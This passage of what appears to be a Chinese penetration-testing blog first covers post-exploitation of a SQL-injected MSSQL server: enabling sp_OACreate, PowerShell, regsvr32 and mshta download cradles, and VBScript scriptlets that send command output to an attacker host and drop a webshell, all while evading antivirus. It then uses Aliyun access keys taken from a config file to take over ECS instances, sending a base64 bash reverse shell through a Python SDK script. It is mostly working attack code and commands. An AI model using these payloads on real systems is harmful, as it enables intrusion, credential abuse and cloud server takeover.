<img src="https://img-blog.csdnimg.cn/20201011210258589.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>
通过启用xp_cmdshell失败，sqlmap还会尝试<code>sp_OACreate</code>，<code>sp_OACreate</code>这个方式是不带回显的，通常利用语句如下：</p>
<pre><code class="prism language-c">EXEC sp_configure <span class="token string">'show advanced options'</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">;</span>   
RECONFIGURE WITH OVERRIDE<span class="token punctuation">;</span>   
EXEC sp_configure <span class="token string">'Ole Automation Procedures'</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">;</span>
RECONFIGURE WITH OVERRIDE<span class="token punctuation">;</span>   
EXEC sp_configure <span class="token string">'show advanced options'</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">;</span>
</code></pre>
<p>执行：</p>
<pre><code class="prism language-c">declare @shell <span class="token keyword">int</span> exec sp_oacreate <span class="token string">'wscript.shell'</span><span class="token punctuation">,</span>@shell output exec sp_oamethod @shell<span class="token punctuation">,</span><span class="token string">'run'</span><span class="token punctuation">,</span>null<span class="token punctuation">,</span><span class="token string">'c:\windows\system32\cmd.exe /c whoami &gt;C:\who.txt'</span>
</code></pre>
<p>通过调用<code>sp_oacreate</code>能够获得一个数字返回值，若全是0，则执行失败，必须有1。</p>
<p><strong>2、判断网络环境</strong></p>
<p>能执行命令后，为了判断能否出网，先尝试DNS Log。<br>
<img src="https://img-blog.csdnimg.cn/20201011210439918.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>
<img src="https://img-blog.csdnimg.cn/20201011210446254.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>
在<code>os-shell</code>中，执行：<code>nslookup xxxxx.net</code>，burp看回显即可。<br>
<img src="https://img-blog.csdnimg.cn/20201011210456947.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>
DNS能出，接下来看TCP报文…</p>
<p>这里我使用<code>certutil、bitsadmin</code>命令来测试，但是么有截图…</p>
<pre><code class="prism language-c">$ python3 <span class="token operator">-</span>m http<span class="token punctuation">.</span>server
os<span class="token operator">-</span>shell<span class="token operator">&gt;</span>certutil <span class="token operator">-</span>urlcache <span class="token operator">-</span>split <span class="token operator">-</span>f http<span class="token punctuation">:</span><span class="token operator">/</span><span class="token operator">/</span>xxx<span class="token punctuation">:</span><span class="token number">8000</span><span class="token operator">/</span>
</code></pre>
<p>收到相应的请求后，基本上稳妥了，可以采用reverse_tcp的方案，用powershell反弹一个beacon到cobalt strike上。</p>
<p><strong>3、Regsvr32妙用</strong></p>
<p>测试的过程中，并不顺利，后来我发现它有反病毒软件…</p>
<p>尝试了以下方法：</p>
<pre><code class="prism language-c">powershell<span class="token punctuation">.</span>exe <span class="token operator">-</span>nop <span class="token operator">-</span>w hidden <span class="token operator">-</span>c <span class="token string">"IEX ((new-object net.webclient).downloadstring('http://xx.xx.xx.xx/a22'))"</span>

regsvr32 <span class="token operator">/</span>s <span class="token operator">/</span>n <span class="token operator">/</span>u <span class="token operator">/</span>i<span class="token punctuation">:</span>http<span class="token punctuation">:</span><span class="token operator">/</span><span class="token operator">/</span>x<span class="token punctuation">.</span>x<span class="token punctuation">.</span><span class="token number">0.</span>x<span class="token punctuation">:</span><span class="token number">8080</span><span class="token operator">/</span>zfgJrh6V<span class="token punctuation">.</span>sct scrobj<span class="token punctuation">.</span>dll

mshta http<span class="token punctuation">:</span><span class="token operator">/</span><span class="token operator">/</span>xxx<span class="token punctuation">.</span>xx<span class="token punctuation">.</span>xx<span class="token punctuation">.</span>xx<span class="token operator">/</span><span class="token number">1.</span>hta
</code></pre>
<p>然后我发现<code>msf exploit/multi/script/web_delivery</code>生成的地址，都会在底层调用一层powershell<br>
<img src="https://img-blog.csdnimg.cn/20201011210652946.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
<p>目前，这种download+iex方式肯定不行了，然后我就改了几个脚本，通过HTTP Log来回显执行结果：</p>
<p>获取进程列表：</p>
<pre><code class="prism language-c"><span class="token operator">&lt;</span><span class="token operator">?</span>XML version<span class="token operator">=</span><span class="token string">"1.0"</span><span class="token operator">?</span><span class="token operator">&gt;</span>
<span class="token operator">&lt;</span>scriptlet<span class="token operator">&gt;</span>
	<span class="token operator">&lt;</span>registration progid<span class="token operator">=</span><span class="token string">"d08c96"</span> classid<span class="token operator">=</span><span class="token string">"{cea46581-c344-4157-b891-30f358f1522d}"</span> <span class="token operator">&gt;</span>
		<span class="token operator">&lt;</span>script language<span class="token operator">=</span><span class="token string">"vbscript"</span><span class="token operator">&gt;</span>
<span class="token operator">&lt;</span><span class="token operator">!</span><span class="token punctuation">[</span>CDATA<span class="token punctuation">[</span>
Sub <span class="token function">getName</span><span class="token punctuation">(</span>name<span class="token punctuation">)</span>
  	Dim http
	Set http <span class="token operator">=</span> <span class="token function">CreateObject</span><span class="token punctuation">(</span><span class="token string">"Msxml2.ServerXMLHTTP"</span><span class="token punctuation">)</span>
	http<span class="token punctuation">.</span>open <span class="token string">"GET"</span><span class="token punctuation">,</span><span class="token string">"http://xxx.xxx.xxx.xxx:8086/"</span><span class="token operator">+</span>name<span class="token punctuation">,</span> False
	http<span class="token punctuation">.</span>send
End Sub

Sub <span class="token function">Cmd</span><span class="token punctuation">(</span>command<span class="token punctuation">)</span>
Set oShell <span class="token operator">=</span> <span class="token function">CreateObject</span><span class="token punctuation">(</span><span class="token string">"WScript.Shell"</span><span class="token punctuation">)</span>
Set Re <span class="token operator">=</span> oShell<span class="token punctuation">.</span><span class="token function">Exec</span><span class="token punctuation">(</span>command<span class="token punctuation">)</span>

Do While Not Re<span class="token punctuation">.</span>StdOut<span class="token punctuation">.</span>AtEndOfStream
	getName Re<span class="token punctuation">.</span>StdOut<span class="token punctuation">.</span><span class="token function">ReadLine</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
Loop
End Sub

Cmd <span class="token string">"powershell -w hidden -c $s=Get-Process;$process ='';foreach ($n in $s){$process += $n.Name+'|'}$Bytes = [System.Text.Encoding]::Unicode.GetBytes($process);$EncodedText =[Convert]::ToBase64String($Bytes);Write-Host $EncodedText;exit;"</span>
<span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token operator">&gt;</span>
		<span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">&gt;</span>
	<span class="token operator">&lt;</span><span class="token operator">/</span>registration<span class="token operator">&gt;</span>
<span class="token operator">&lt;</span><span class="token operator">/</span>scriptlet<span class="token operator">&gt;</span>
</code></pre>
<p><strong>执行：</strong></p>
<pre><code class="prism language-c">wmic process call create <span class="token string">"regsvr32 /s /n /u /i:http://xxx.xxx.xxx.xxx:8086/p.txt scrobj.dll"</span>
</code></pre>
<p><img src="https://img-blog.csdnimg.cn/20201011210722795.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
<p>获得回显。<br>
<img src="https://img-blog.csdnimg.cn/20201011210735580.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>
<img src="https://img-blog.csdnimg.cn/20201011210743960.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>
获得进程列表后，看到有<code>EST Nod32、360</code>等防护软件，看来需要做的工作有很多。</p>
<p>列目录：</p>
<pre><code class="prism language-c"><span class="token operator">&lt;</span><span class="token operator">?</span>XML version<span class="token operator">=</span><span class="token string">"1.0"</span><span class="token operator">?</span><span class="token operator">&gt;</span>
<span class="token operator">&lt;</span>scriptlet<span class="token operator">&gt;</span>
	<span class="token operator">&lt;</span>registration progid<span class="token operator">=</span><span class="token string">"d08c96"</span> classid<span class="token operator">=</span><span class="token string">"{cea46581-c344-4157-b891-30f358f1522d}"</span> <span class="token operator">&gt;</span>
		<span class="token operator">&lt;</span>script language<span class="token operator">=</span><span class="token string">"vbscript"</span><span class="token operator">&gt;</span>
<span class="token operator">&lt;</span><span class="token operator">!</span><span class="token punctuation">[</span>CDATA<span class="token punctuation">[</span>
Sub <span class="token function">getName</span><span class="token punctuation">(</span>name<span class="token punctuation">)</span>
  	Dim http
	Set http <span class="token operator">=</span> <span class="token function">CreateObject</span><span class="token punctuation">(</span><span class="token string">"Msxml2.ServerXMLHTTP"</span><span class="token punctuation">)</span>
	http<span class="token punctuation">.</span>open <span class="token string">"GET"</span><span class="token punctuation">,</span><span class="token string">"http://xxx.xxx.xxx.xxx:8086/"</span><span class="token operator">+</span>name<span class="token punctuation">,</span> False
	http<span class="token punctuation">.</span>send
End Sub

Sub <span class="token function">Cmd</span><span class="token punctuation">(</span>command<span class="token punctuation">)</span>
Set oShell <span class="token operator">=</span> <span class="token function">CreateObject</span><span class="token punctuation">(</span><span class="token string">"WScript.Shell"</span><span class="token punctuation">)</span>
Set Re <span class="token operator">=</span> oShell<span class="token punctuation">.</span><span class="token function">Exec</span><span class="token punctuation">(</span>command<span class="token punctuation">)</span>

Do While Not Re<span class="token punctuation">.</span>StdOut<span class="token punctuation">.</span>AtEndOfStream
	getName Re<span class="token punctuation">.</span>StdOut<span class="token punctuation">.</span><span class="token function">ReadLine</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
Loop
End Sub

Cmd <span class="token string">"powershell -w hidden -c $s=Get-ChildItem D:\web4_new\;$process ='';foreach ($n in $s){$process += $n.Name+'|'}$Bytes = [System.Text.Encoding]::Unicode.GetBytes($process);$EncodedText =[Convert]::ToBase64String($Bytes);Write-Host $EncodedText;exit;"</span>
<span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token operator">&gt;</span>
		<span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">&gt;</span>
	<span class="token operator">&lt;</span><span class="token operator">/</span>registration<span class="token operator">&gt;</span>
<span class="token operator">&lt;</span><span class="token operator">/</span>scriptlet<span class="token operator">&gt;</span>
</code></pre>
<p>下载Webshell：</p>
<pre><code class="prism language-c"><span class="token operator">&lt;</span><span class="token operator">?</span>XML version<span class="token operator">=</span><span class="token string">"1.0"</span><span class="token operator">?</span><span class="token operator">&gt;</span>
<span class="token operator">&lt;</span>scriptlet<span class="token operator">&gt;</span>
	<span class="token operator">&lt;</span>registration progid<span class="token operator">=</span><span class="token string">"d08c96"</span> classid<span class="token operator">=</span><span class="token string">"{cea46581-c344-4157-b891-30f358f1522d}"</span> <span class="token operator">&gt;</span>
		<span class="token operator">&lt;</span>script language<span class="token operator">=</span><span class="token string">"vbscript"</span><span class="token operator">&gt;</span>
		<span class="token operator">&lt;</span><span class="token operator">!</span><span class="token punctuation">[</span>CDATA<span class="token punctuation">[</span>
Set Shell <span class="token operator">=</span> <span class="token function">CreateObject</span><span class="token punctuation">(</span><span class="token string">"Wscript.Shell"</span><span class="token punctuation">)</span>
Set Post <span class="token operator">=</span> <span class="token function">CreateObject</span><span class="token punctuation">(</span><span class="token string">"Msxml2.XMLHTTP"</span><span class="token punctuation">)</span>
wfolder <span class="token operator">=</span> <span class="token string">"C:\inetpub\wwwroot\xxx\111english.aspx"</span>
Post<span class="token punctuation">.</span>Open <span class="token string">"GET"</span><span class="token punctuation">,</span><span class="token string">"http://xxx.xxxx.xxx.xxx:85/bak/english.txt"</span><span class="token punctuation">,</span><span class="token number">0</span>
Post<span class="token punctuation">.</span><span class="token function">Send</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
Set aGet <span class="token operator">=</span> <span class="token function">CreateObject</span><span class="token punctuation">(</span><span class="token string">"ADODB.Stream"</span><span class="token punctuation">)</span>
aGet<span class="token punctuation">.</span>Mode <span class="token operator">=</span> <span class="token number">3</span>
aGet<span class="token punctuation">.</span>Type <span class="token operator">=</span> <span class="token number">1</span>
aGet<span class="token punctuation">.</span><span class="token function">Open</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
aGet<span class="token punctuation">.</span><span class="token function">Write</span><span class="token punctuation">(</span>Post<span class="token punctuation">.</span>responseBody<span class="token punctuation">)</span>

aGet<span class="token punctuation">.</span>SaveToFile wfolder<span class="token punctuation">,</span><span class="token number">2</span>

		<span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token operator">&gt;</span>
		<span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">&gt;</span>
	<span class="token operator">&lt;</span><span class="token operator">/</span>registration<span class="token operator">&gt;</span>
<span class="token operator">&lt;</span><span class="token operator">/</span>scriptlet<span class="token operator">&gt;</span>
</code></pre>
<p>通过指定不同的txt，执行不同的代码。<br>
<img src="https://img-blog.csdnimg.cn/2020101121084128.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
<p>当然，毫无疑问的最终获得了beacon：</p>
<p><img src="https://img-blog.csdnimg.cn/20201011210855423.png#pic_center" alt="在这里插入图片描述"><br>
免杀环节就不记录了。</p>
<p><strong>4、总结</strong><br>
<img src="https://img-blog.csdnimg.cn/20201011210921228.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>
外网多个SQL注入-SQL Server DBA，无回显，360+ESET NOD32 Antivirus，regsvr32通过一个ole对象执行VBscript，使用<code>--os-shell</code>，底层执行的父进程是一个mssql service，所以av可能不那么关注，但是通过–os-shell直接创建powershell，就会被拦截；</p>
<p>通过加载我服务器上的sct文件，执行自定义的vbs之外，我发现它不会阻止vbs派生powershell；</p>
<p>但是通过vbs直接派生powershell下载代码执行、或直接反弹，都被干掉。由于没有回显，无法确定我免杀的木马落地目录，只能用powershell获取目录、当前用户情况，返回base64，交给vbs，请求http log。得到服务器环境，最终确定落地目录后，基本上就可以getshell、上线等操作。</p>
<p><img src="https://img-blog.csdnimg.cn/20201011210956406.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>
由于反病毒软件会监控xp_cmdshell，一执行就会返回<code>CreateProcess Error Code 5</code>等问题，<code>sp_oacreate</code>是能够解决，但是没有回显，可通过发送网络请求来看。</p>
<p>sp_oacreate是基于ole对象的，ole对象执行拦截的较少、包括regsvr32也是调用的ole对象去执行vbs代码，这其中有一种白名单派生关系。</p>
<p><strong>语法</strong></p>
<pre><code class="prism language-c">sp_OACreate progid<span class="token punctuation">,</span> <span class="token operator">|</span> clsid<span class="token punctuation">,</span>
objecttoken OUTPUT
<span class="token punctuation">[</span> <span class="token punctuation">,</span> context <span class="token punctuation">]</span>
declare @shell <span class="token keyword">int</span> exec sp_oacreate <span class="token string">'wscript.shell'</span><span class="token punctuation">,</span>@shell output exec sp_oamethod @shell<span class="token punctuation">,</span><span class="token string">'run'</span><span class="token punctuation">,</span>null<span class="token punctuation">,</span><span class="token string">'c:\windows\system32\cmd.exe /c whoami &gt;C:\who.txt'</span>
</code></pre>
<p>其中<code>'wscript.shell'</code>就是一个对象，这个对象可以是其他ole对象，具体还需要继续发掘</p>
<hr>
<h2><a id="132_Access_Token___3854"></a>13.2 阿里云Access Token问题 - 项目收获记录</h2>
<p><strong>0x00 前言</strong></p>
<p>Q：在获得权限较低的Webshell的情况下，如何继续扩大收获？</p>
<p>A：首先，信息搜集，分别包含：当前权限，主机网络环境、系统进程、网络连接状况、散落的凭证等，然后进行战略分析</p>
<pre><code class="prism language-c"><span class="token number">1</span>）是否需要提权
<span class="token number">2</span>）如何将流量带入（转发）
<span class="token number">3</span>）结合搜集的信息转化出其他更好的思路
</code></pre>
<p>很巧，我遇到了第三种情况。</p>
<p><strong>Tips：内网渗透一般提权是最不可取的方案，我们只需要不断搜集信息、撕开一个流量口子即可。</strong></p>
<p><strong>0x01 阿里云对象存储 - OSS</strong></p>
<p>什么是对象存储？</p>
<p>阿里云对象存储服务（Object Storage Service，简称OSS），是阿里云对外提供的海量、安全、低成本、高可靠的云存储服务。您可以通过本文档提供的简单的REST接口，在任何时间、任何地点、任何互联网设备上进行上传和下载数据。基于OSS，您可以搭建出各种多媒体分享网站、网盘、个人和企业数据备份等基于大规模数据的服务。</p>
<p>通过Webshell在目标机器（Linux）的Web站点目录下发现多个子站配置文件<code>config.php</code>，配置了同一个阿里云的OSS地址，只是存储空间（Bucket）不同。</p>
<p>通常情况下一个阿里云oss地址的组成如下：</p>
<pre><code class="prism language-c"><span class="token function">http</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token operator">/</span><span class="token operator">/</span><span class="token punctuation">[</span>BucketName<span class="token punctuation">]</span><span class="token punctuation">.</span>oss<span class="token operator">-</span>cn<span class="token operator">-</span><span class="token punctuation">[</span>Region<span class="token punctuation">]</span><span class="token punctuation">.</span>aliyuncs<span class="token punctuation">.</span>com
</code></pre>
<p>BucketName ：存储空间</p>
<p>Region：地域，目前有如下几个：</p>
<p><img src="https://img-blog.csdnimg.cn/20201011211455764.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>
例如：杭州 = cn-hangzhou</p>
<p><strong>0x02 Access Token</strong></p>
<p>Access Token = AccessKeyId + AccessKeySecret</p>
<p>OSS通过使用AccessKeyId/ AccessKeySecret对称加密的方法来验证某个请求的发送者身份。</p>
<p>AccessKeyId用于标示用户，AccessKeySecret是用户用于加密签名字符串和OSS用来验证签名字符串的密钥，其中AccessKeySecret必须保密，只有用户和OSS知道。AccessKey 根据所属账号的类型有所区分。</p>
<p><strong>阿里云账户AccessKey：阿里云账号提供的AccessKey拥有所属资源的全部操作权限</strong></p>
<p>RAM账户AccessKey：RAM账户由阿里云账号授权生成，所拥有的AccessKey拥有对特定资源限定的操作权限</p>
<p>STS临时访问凭证：由阿里云账号或RAM账号生成，所拥有的AccessKey在限定时间内拥有对特定资源限定的操作权限。过期权限收回。</p>
<p>详细介绍</p>
<p><strong>0x03 通过Access Token接管ECS</strong></p>
<p>ECS：云服务器（Elastic Compute Service，简称 ECS）是一种简单高效、处理能力可弹性伸缩的计算服务，帮助您快速构建更稳定、安全的应用，提升运维效率，降低 IT 成本，使您更专注于核心业务创新。</p>
<p>前面介绍到，默认情况下，阿里云用户获得的Access Token是对当前用户所有服务通用的令牌，在没有使用RAM账户的情况下，就可以使用SDK去操作阿里云所有产品。</p>
<p>在此次项目里，我接管了四台ECS，执行任意命令，获得最大权限。</p>
<p>首先，通过读取配置文件，获得了同于上传图片所需要认证的Access Token，如何检验是否可用的呢？</p>
<pre><code class="prism language-c">Access Key Id <span class="token punctuation">:</span> <span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span>
Access Secret <span class="token punctuation">:</span> <span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span>
Region <span class="token punctuation">:</span> cn<span class="token operator">-</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span>
</code></pre>
<p>下面直接调用获取ECS实例的API即可，以往情况下，我会使用Python，安装阿里云的sdk-core库，但是现在能在线调试，大大的节省了本地调试的成本：</p>
<p>DescribeInstances - 获得实例信息</p>
<p><img src="https://img-blog.csdnimg.cn/20201011211558127.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>
只有第一个<code>RegionId</code>是必填项，点击<code>API Explorer</code>，可以直接进入调试环境：<br>
<img src="https://img-blog.csdnimg.cn/20201011211618364.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>
服务器上的oss配置中刚好有RegionId，我就直接选择了，然后填入Access Token信息，就可以获得数据。</p>
<p>我是直接在<code>Alicloud Shell</code>里复制了一份运行的：<br>
<img src="https://img-blog.csdnimg.cn/20201011211636799.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>
输出结果如下：<br>
<img src="https://img-blog.csdnimg.cn/20201011211648209.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>
使用<code>json.cn</code>格式化一下：<br>
<img src="https://img-blog.csdnimg.cn/20201011211703948.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>
共四台服务器，那么如何执行命令呢？</p>
<p>首先要创建一条命令，然后指定实例来调用命令，手册地址：</p>
<pre><code class="prism language-c">https<span class="token punctuation">:</span><span class="token operator">/</span><span class="token operator">/</span>help<span class="token punctuation">.</span>aliyun<span class="token punctuation">.</span>com<span class="token operator">/</span>document_detail<span class="token operator">/</span><span class="token number">64844.</span>html
</code></pre>
<p>命令的类型取值范围：</p>
<pre><code class="prism language-c">RunBatScript：创建一个在 Windows 实例中运行的 Bat 脚本
RunPowerShellScript：创建一个在 Windows 实例中运行的 PowerShell 脚本
RunShellScript：创建一个在 Linux 实例中运行的 Shell 脚本
</code></pre>
<p>由于都是Linux，我就选择RunShellScript，注意：命令必须是base64encode</p>
<pre><code class="prism language-c">rvn0xsy@Rvn0xsy <span class="token operator">~</span><span class="token operator">&gt;</span> echo <span class="token string">"bash -i &gt;&amp; /dev/tcp/1.1.1.1/2333 0&gt;&amp;1"</span> <span class="token operator">|</span> base64
YmFzaCAtaSA<span class="token operator">+</span>JiAvZGV2L3RjcC8xLjEuMS4xLzIzMzMgMD4mMQo<span class="token operator">=</span>
</code></pre>
<p><img src="https://img-blog.csdnimg.cn/202010112117369.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
<pre><code class="prism language-c">#<span class="token operator">!</span><span class="token operator">/</span>usr<span class="token operator">/</span>bin<span class="token operator">/</span>env python
<span class="token macro property">#coding=utf-8</span>

from aliyunsdkcore<span class="token punctuation">.</span>client import AcsClient
from aliyunsdkcore<span class="token punctuation">.</span>acs_exception<span class="token punctuation">.</span>exceptions import ClientException
from aliyunsdkcore<span class="token punctuation">.</span>acs_exception<span class="token punctuation">.</span>exceptions import ServerException
from aliyunsdkecs<span class="token punctuation">.</span>request<span class="token punctuation">.</span>v20140526<span class="token punctuation">.</span>CreateCommandRequest import CreateCommandRequest

client <span class="token operator">=</span> <span class="token function">AcsClient</span><span class="token punctuation">(</span><span class="token string">'&lt;accessKeyId&gt;'</span><span class="token punctuation">,</span> <span class="token string">'&lt;accessSecret&gt;'</span><span class="token punctuation">,</span> <span class="token string">'cn-shanghai'</span><span class="token punctuation">)</span>

request <span class="token operator">=</span> <span class="token function">CreateCommandRequest</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
request<span class="token punctuation">.</span><span class="token function">set_accept_format</span><span class="token punctuation">(</span><span class="token string">'json'</span><span class="token punctuation">)</span>

request<span class="token punctuation">.</span><span class="token function">set_Type</span><span class="token punctuation">(</span><span class="token string">"RunShellScript"</span><span class="token punctuation">)</span>
request<span class="token punctuation">.</span><span class="token function">set_CommandContent</span><span class="token punctuation">(</span><span class="token string">"YmFzaCAtaSA+JiAvZGV2L3RjcC8xLjEuMS4xLzIzMzMgMD4mMQo="</span><span class="token punctuation">)</span>
request<span class="token punctuation">.</span><span class="token function">set_Name</span><span class="token punctuation">(</span><span class="token string">"test"</span><span class="token punctuation">)</span>

response <span class="token operator">=</span> client<span class="token punctuation">.</span><span class="token function">do_action_with_exception</span><span class="token punctuation">(</span>request<span class="token punctuation">)</span>
<span class="token macro property"># python2:  print(response) </span>
<span class="token function">print</span><span class="token punctuation">(</span><span class="token function">str</span><span class="token punctuation">(</span>response<span class="token punctuation">,</span> encoding<span class="token operator">=</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
</code></pre>
<p>执行成功后，会返回如下信息：</p>
<pre><code class="prism language-c"><span class="token punctuation">{</span>
	<span class="token string">"RequestId"</span><span class="token punctuation">:</span> <span class="token string">"********-****-****-****-********"</span><span class="token punctuation">,</span>
	<span class="token string">"CommandId"</span><span class="token punctuation">:</span> <span class="token string">"c-0************"</span>
<span class="token punctuation">}</span>
</code></pre>
<p>CommandId最好记下来，不然还要调用DescribeCommands</p>
<pre><code class="prism language-c"><span class="token punctuation">{</span>
	<span class="token string">"PageNumber"</span><span class="token punctuation">:</span> <span class="token number">1</span><span class="token punctuation">,</span>
	<span class="token string">"TotalCount"</span><span class="token punctuation">:</span> <span class="token number">1</span><span class="token punctuation">,</span>
	<span class="token string">"PageSize"</span><span class="token punctuation">:</span> <span class="token number">10</span><span class="token punctuation">,</span>
	<span class="token string">"RequestId"</span><span class="token punctuation">:</span> <span class="token string">"********-****-****-****-********"</span><span class="token punctuation">,</span>
	<span class="token string">"Commands"</span><span class="token punctuation">:</span> <span class="token punctuation">{</span>
		<span class="token string">"Command"</span><span class="token punctuation">:</span> <span class="token punctuation">[</span>
			<span class="token punctuation">{</span>
				<span class="token string">"Name"</span><span class="token punctuation">:</span> <span class="token string">"test"</span><span class="token punctuation">,</span>
				<span class="token string">"Timeout"</span><span class="token punctuation">:</span> <span class="token number">3600</span><span class="token punctuation">,</span>
				<span class="token string">"CommandContent"</span><span class="token punctuation">:</span> <span class="token string">"YmFzaCAtaSA+JiAvZGV2L3RjcC8xLjEuMS4xLzIzMzMgMD4mMQo="</span><span class="token punctuation">,</span>
				<span class="token string">"Description"</span><span class="token punctuation">:</span> <span class="token string">""</span><span class="token punctuation">,</span>
				<span class="token string">"Type"</span><span class="token punctuation">:</span> <span class="token string">"RunShellScript"</span><span class="token punctuation">,</span>
				<span class="token string">"CommandId"</span><span class="token punctuation">:</span> <span class="token string">"c-0************"</span><span class="token punctuation">,</span>
				<span class="token string">"WorkingDir"</span><span class="token punctuation">:</span> <span class="token string">""</span>
			<span class="token punctuation">}</span>
		<span class="token punctuation">]</span>
	<span class="token punctuation">}</span>
<span class="token punctuation">}</span>
</code></pre>
<p>紧接着就是<code>InvokeCommand</code>：</p>
<pre><code class="prism language-c">RegionId：区域ID，例如：cn<span class="token operator">-</span>shanghai
CommandId：命令ID
InstanceId：实例ID
Timed：命令是否为周期执行。 默认值：False
Frequency：周期任务的执行周期，两次周期任务的时间间隔不能低于<span class="token number">10</span>秒。当参数 Timed 的值为 True 时，参数 Frequency 为必需参数。 该参数取值遵循Cron表达式，参阅Cron表达式。
</code></pre>
